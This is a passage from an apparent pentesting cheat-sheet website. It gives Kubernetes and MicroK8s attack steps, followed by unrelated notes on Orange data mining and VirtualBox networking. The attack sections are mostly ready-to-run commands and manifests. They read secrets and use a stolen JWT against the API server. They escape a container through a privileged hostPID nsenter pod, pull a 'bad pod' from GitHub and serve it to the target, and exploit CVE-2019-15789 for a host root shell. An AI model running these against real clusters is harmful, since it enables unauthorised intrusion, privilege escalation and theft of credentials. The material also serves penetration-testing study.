</span><span id="__span-11-33"><a id="__codelineno-11-33" name="__codelineno-11-33" href="#__codelineno-11-33"></a>kubectl get secrets -n &lt;namespace&gt;
</span><span id="__span-11-34"><a id="__codelineno-11-34" name="__codelineno-11-34" href="#__codelineno-11-34"></a># Get the specific secret
</span><span id="__span-11-35"><a id="__codelineno-11-35" name="__codelineno-11-35" href="#__codelineno-11-35"></a>kubectl get secret &lt;secret-name&gt; -o json
</span><span id="__span-11-36"><a id="__codelineno-11-36" name="__codelineno-11-36" href="#__codelineno-11-36"></a>kubectl get secret &lt;secret-name&gt; -n &lt;namespace&gt; -o json
</span><span id="__span-11-37"><a id="__codelineno-11-37" name="__codelineno-11-37" href="#__codelineno-11-37"></a># Edit the secret
</span><span id="__span-11-38"><a id="__codelineno-11-38" name="__codelineno-11-38" href="#__codelineno-11-38"></a>kubectl edit secret &lt;secret-name&gt;
</span><span id="__span-11-39"><a id="__codelineno-11-39" name="__codelineno-11-39" href="#__codelineno-11-39"></a>kubectl edit secret &lt;secret-name&gt; -n &lt;namespace&gt;
</span><span id="__span-11-40"><a id="__codelineno-11-40" name="__codelineno-11-40" href="#__codelineno-11-40"></a># List all data contained in the specific secret
</span><span id="__span-11-41"><a id="__codelineno-11-41" name="__codelineno-11-41" href="#__codelineno-11-41"></a>kubectl describe secret &lt;secret-name&gt;
</span><span id="__span-11-42"><a id="__codelineno-11-42" name="__codelineno-11-42" href="#__codelineno-11-42"></a>kubectl describe secret &lt;secret-name&gt; -n &lt;namespace&gt;
</span><span id="__span-11-43"><a id="__codelineno-11-43" name="__codelineno-11-43" href="#__codelineno-11-43"></a>
</span><span id="__span-11-44"><a id="__codelineno-11-44" name="__codelineno-11-44" href="#__codelineno-11-44"></a>
</span><span id="__span-11-45"><a id="__codelineno-11-45" name="__codelineno-11-45" href="#__codelineno-11-45"></a># Create a ServiceAccount
</span><span id="__span-11-46"><a id="__codelineno-11-46" name="__codelineno-11-46" href="#__codelineno-11-46"></a>kubectl create serviceaccount api-explorer
</span><span id="__span-11-47"><a id="__codelineno-11-47" name="__codelineno-11-47" href="#__codelineno-11-47"></a># Bind the ClusterRole to the ServiceAccount
</span><span id="__span-11-48"><a id="__codelineno-11-48" name="__codelineno-11-48" href="#__codelineno-11-48"></a># eg. namespace: default
</span><span id="__span-11-49"><a id="__codelineno-11-49" name="__codelineno-11-49" href="#__codelineno-11-49"></a>kubectl create rolebinding api-explorer:log-reader --clusterrole log-reader --serviceaccount default:api-explorer 
</span></code></pre></div>
<h2 id="investigation-via-kubernetes-api-server">Investigation via Kubernetes API Server</h2>
<p>If we get the JWT, we can fetch information by the following commans.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># -k: insecure (HTTPS)
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>curl -k -v -H &quot;Authorization: Bearer &lt;jwt-token&gt;&quot; https://&lt;target-ip&gt;:&lt;target-port&gt;/api/v1/namespaces/default/pods/
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>curl -k -v -H &quot;Authorization: Bearer &lt;jwt-token&gt;&quot; https://&lt;target-ip&gt;:&lt;target-port&gt;/api/v1/namespaces/default/secrets/
</span></code></pre></div>
<h2 id="privilege-escalation-escape-using-the-container-image">Privilege Escalation (Escape) using the Container Image</h2>
<h3 id="1-get-information-about-the-target-pod">1. Get Information About the Target Pod</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>kubectl get pods
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>kubectl get pod &lt;target-pod&gt; -o yaml
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>kubectl describe pod &lt;target-pod&gt;
</span></code></pre></div>
<p>In the output, check the image name in the containers image.</p>
<h3 id="2-create-a-pod-yaml-file">2. Create a Pod Yaml File</h3>
<p>Create "pod.yaml".<br />
Replace the containers image value (<strong>\&lt;image_name&gt;</strong>) with the one we found in the previous section.</p>
<div class="language-yaml highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nt">spec</span><span class="p">:</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">  </span><span class="nt">hostPID</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">  </span><span class="nt">containers</span><span class="p">:</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;1&#39;</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">      </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">&lt;image_name&gt;</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">      </span><span class="nt">command</span><span class="p">:</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">nsenter</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;--mount=/proc/1/ns/mnt&#39;</span>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;--&#39;</span>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/bin/bash</span>
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">  </span><span class="nt">stdin</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w">  </span><span class="nt">tty</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">  </span><span class="nt">securityContext</span><span class="p">:</span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">    </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
</span></code></pre></div>
<p>After that, convert the YAML to JSON using online tools such as the <a href="https://www.convertjson.com/yaml-to-json.htm">Online Converter</a>.<br />
In the tool, check the <strong>“Minimize JSON”</strong> to make the json to the one line.</p>
<h3 id="3-run-the-new-container-to-privilege-escalation">3. Run the New Container to Privilege Escalation</h3>
<p>Replace with <strong>\&lt;image_name&gt;</strong> with the one we found in the previous section.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>kubectl run testbox --restart Never -it --rm --image newimage --overrides &#39;{&quot;spec&quot;:{&quot;hostPID&quot;:true,&quot;containers&quot;:[{&quot;name&quot;:&quot;1&quot;,&quot;image&quot;:&quot;&lt;image_name&gt;&quot;,&quot;command&quot;:[&quot;nsenter&quot;,&quot;--mount=/proc/1/ns/mnt&quot;,&quot;--&quot;,&quot;/bin/bash&quot;],&quot;stdin&quot;:true,&quot;tty&quot;:true,&quot;securityContext&quot;:{&quot;privileged&quot;:true}}]}}&#39;
</span></code></pre></div>
<p>Now we should escape the container and get a target shell.</p>
<h2 id="privilege-escalation-using-bad-pods">Privilege Escalation using Bad Pods</h2>
<p>Reference: <a href="https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml">everything-allowed-exec-pod.yaml</a></p>
<h3 id="1-download-the-bad-pod">1. Download the Bad Pod</h3>
<p>At first, you need to download the bad pod on your local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml -O privesc.yaml
</span></code></pre></div>
<p>After downloading the yaml file, we need to replace the value of <strong>metadata.containers.image</strong> with the <strong>existing container image</strong> that we can find in the target container.<br />
Then start web server to allow the target machine to get this bad pod.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>python3 -m http.server 8000
</span></code></pre></div>
<h3 id="2-trasfer-the-bad-pod-to-the-target-machine">2. Trasfer the Bad Pod to the Target Machine</h3>
<p>On the target machine, download the bad pod from your local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>wget http://&lt;your-local-ip&gt;:8000/privesc.yaml
</span></code></pre></div>
<h3 id="3-create-the-pod">3. Create the Pod</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a># Create the pod
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>kubectl apply -f privesc.yaml --token=&lt;JWT&gt;
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a># List all pods
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>kubectl get pods --token=&lt;JWT&gt;
</span></code></pre></div>
<h3 id="4-get-a-shell">4. Get a Shell**</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>kubectl exec -it everything-allowed-exec-pod --token=&lt;JWT&gt; -- /bin/bash
</span></code></pre></div>
<p>We should get a shell and can investigate the mounted folder.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>cd /host
</span></code></pre></div>
<h1 id="microk8s-pentesting">MicroK8s Pentesting</h1>
<p>MicroK8s is a small, fast, single-package Kubernetes for developers.</p>
<div class="language-text highlight"><pre><span></span><code>- [microk8s.io](https://microk8s.io/docs/services-and-ports)
</code></pre></div>
<h2 id="ports-and-services">Ports and Services</h2>
<ul>
<li>Port 10250 - kubelet</li>
<li>Port 10255 - kubelet (read only)</li>
<li>Port 10257 - kube-controller</li>
<li>Port 10259 - kube-scheduler</li>
<li>Port 16443 - API server</li>
<li>Port 25000 - cluster-agent</li>
<li>Port 32000 - Docker registry</li>
</ul>
<h2 id="docker-registry-port-32000">Docker Registry (port 32000)</h2>
<p>It is the same as <a href="/exploit/docker-registry-pentesting">Docker Registry Pentesting</a> . </p>
<h2 id="investigation-from-inside_1">Investigation from Inside</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a># Version
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>snap info microk8s
</span></code></pre></div>
<h2 id="privilege-escalation-cve-2019-15789-1152">Privilege Escalation (CVE-2019-15789) ≤ 1.15.2</h2>
<p>See <a href="https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation">the post</a> for details.</p>
<h3 id="1-create-a-pod-yaml-file">1. Create a Pod Yaml File</h3>
<p>Replace the value of spec.containers.image with the image which we found in target system.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>apiVersion: v1
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>kind: Pod
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>metadata:
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>  name: hostmount
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>spec:
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>  containers:
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>  - name: shell
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    image: ubuntu:latest
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>    command:
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>      - &quot;bin/bash&quot;
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>      - &quot;-c&quot;
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>      - &quot;sleep 10000&quot;
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>    volumeMounts:
</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>      - name: root
</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>        mountPath: /opt/root
</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>  volumes:
</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>  - name: root
</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>    hostPath:
</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>      path: /
</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>      type: Directory
</span></code></pre></div>
<h3 id="2-apply-the-yaml-and-get-a-root-shell">2. Apply the Yaml and Get a Root Shell</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>microk8s kubectl apply -f exploit.yaml
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a># &quot;hostmount&quot; is the value of the metadata.name in the exploit.yaml
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>microk8s kubectl exec -it hostmount /bin/bash
</span></code></pre></div>
<h3 id="3-explore-directories">3. Explore Directories</h3>
<p>After getting a shell, we can explore the directories under /opt/root which is mounted volume.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>cd /opt/root
</span></code></pre></div>
<h1 id="orange-data-mining">Orange Data Mining</h1>
<p>Orange is a data-mining and machine learning software that allows users to analyze data, create visualizations, and build predictive models.</p>
<div class="language-text highlight"><pre><span></span><code>- [orange3](https://orange3.readthedocs.io/projects/orange-visual-programming/en/latest/index.html)
</code></pre></div>
<h2 id="installation-start">Installation &amp; Start</h2>
<p>To install Orange, we can install it with <code>pip</code> in Linux.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>pip install PyQt5 PyQtWebEngine
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>pip install orange3
</span></code></pre></div>
<h2 id="basic-usage">Basic Usage</h2>
<h3 id="1-start-orange-software">1. Start Orange Software</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>python -m Orange.canvas
</span></code></pre></div>
<h3 id="2-open-ows-file">2. Open .OWS File</h3>
<p>When the Orange starts, open the <code>.ows</code> file.</p>
<h3 id="3-import-data-file">3. Import Data File</h3>
<p>Add the File widget in the left pane, and import data file such as <code>.csv</code>.</p>
<h3 id="4-workflows">4. Workflows</h3>
<p>Connect the File widget with the Scatter Plot widget and open the Scatter Plot. We can see the data with plot.</p>
<h1 id="virtualbox-settings-for-nat-network-port-forwarding">VirtualBox Settings for NAT Network &amp; Port Forwarding</h1>
<p>In VirtuaoBox, we can connect between a Host OS and a Guest OS by setting NAT network and port forwarding.</p>
<h2 id="1-creat-a-new-network">1. Creat a New Network</h2>
<ol>
<li>Open network settings in <strong>Tools</strong> menu.</li>
<li>
<p>In <strong>General Options</strong> tab, fill each field as below. Regarding <strong><code>IPv4 Prefix</code></strong> field, we can see the IP address of local network by <strong><code>ip config</code></strong> command in Windows, or <strong><code>ip addr</code></strong> command inLinux. Here is the example.  </p>
<ul>
<li>Name: <strong>MyNetwork</strong></li>
<li>IPv4 Prefix: <strong><code>10.x.x.x/24</code></strong> or <strong><code>192.168.x..x/24</code></strong></li>
</ul>
<p>Then uncheck <strong><code>Enable DHCP</code></strong> to set static ip address.</p>
</li>
<li>
<p>In Port Forwarding tab, set ip/port for each guest OS. Here is the example.  </p>
<ul>
<li>Name: Guest 1</li>
<li>Protocol: TCP</li>
<li>Host IP: (empty)</li>
<li>Host Port: <strong>9999</strong> (note that this value must not duplicate the other Host Port in other guest OS line)</li>
<li>Guest IP: <strong>192.168.11.100</strong></li>
<li>Guest Port: <strong>1234</strong></li>
</ul>
</li>
</ol>
<h2 id="2-set-the-network-to-each-guest-os-network">2. Set the Network to Each Guest OS Network</h2>
<ol>
<li>Open settings in guest OS.</li>
<li>In <strong>Network</strong> configuration, select <strong><code>NAT Network</code></strong> and set the network name (e.g. <strong>MyNetwork</strong>) which has been created the previous section.</li>
</ol>
<h2 id="3-set-static-ip-address-in-guest-os">3. Set Static IP Address in Guest OS</h2>
<p>Now start the guest OS in VirtualBox.<br />
Since we disabled <strong>DHCP</strong>, we need to set <strong>static IP address</strong> attached for the guest as it was set in <strong><code>Port Forwarding</code></strong> settings of Network configurations.  </p>
<h3 id="linux">Linux</h3>
<p>Below is the <strong>Parrot OS</strong> example.</p>
<ol>
<li>Right-click on the network icon at the top-right on screen.</li>
<li>Select a connection name and click on the settings icon at the bottom.</li>
<li>
<p>Go to <strong>IPv4 Settings</strong> tab, select <strong><code>Manual</code></strong> in <strong><code>Method</code></strong> menu. Then fill each field as below. These values should be matched as the previous network settings for the guest OS.</p>
<ul>
<li>Address: <strong>192.168.11.100</strong></li>
<li>Netmask: <strong>24</strong></li>
<li>Gateway: <strong>192.168.11.1</strong></li>
<li>DNS servers: <strong>192.168.11.1</strong> (or public DNS server ip like <strong>8.8.8.8</strong>)</li>
</ul>
</li>
</ol>
<h3 id="windows">Windows</h3>
<ol>
<li>Open <strong>Settings</strong>.</li>
<li>Go to <strong>Network and Internet</strong> settings.</li>
<li>Click current connection.</li>
<li>Click <strong>Edit</strong> in the IP settings.</li>
<li>Select <strong><code>Manual</code></strong> and enable the <strong><code>IPv4</code></strong> switch.</li>
<li>Fill each field. Please see the above (Parrot OS) section to check each value.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 id="4-connect-from-host-to-guest">4. Connect From Host to Guest</h2>
<p>Finally, we can connect to the guest OS from our host. For example,</p>
<h3 id="http">HTTP</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a># In guest OS, start web server on port 1234.
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>python3 -m http.server 1234
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a># In host OS, we can access to the web server on local port 9999.
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>curl http://localhost:9999
</span></code></pre></div>
<h3 id="ssh">SSH</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># In guest OS, start SSH server on port 1234.
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>sudo vim /etc/ssh/sshd_config # edit port number to 1234 from the default port 22.
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>sudo systemctl start ssh
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a># In host OS, we can connect SSH on local port 9999
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>ssh parrot@localhost -p 9999
</span></code></pre></div>
<h2 id="5-connect-from-guest-to-host">5. Connect From Guest to Host</h2>
<p>To connect to host OS from the guest, we can achieve by follow.</p>
<h3 id="http_1">HTTP</h3>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a># In host OS, start web server on arbitrary port
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>python3 -m http.server 8000
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a># In guest OS, we can access to the web server by specifying the second ip address (x.x.x.2) in local network.
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>curl http://192.168.11.2:8000
</span></code></pre></div>
QUARKSLAB is a research company specialized in cutting edge solutions to complex security problems. We provide innovative, efficient and practical solutions based on profound knowledge and years of experience in the field.</p>
<div class="language-text highlight"><pre><span></span><code>- http://www.quarkslab.com/
</code></pre></div>
<p>Virtual machine templates for Windows
    - https://github.com/quarkslab/windows</p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/vmpentesting.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>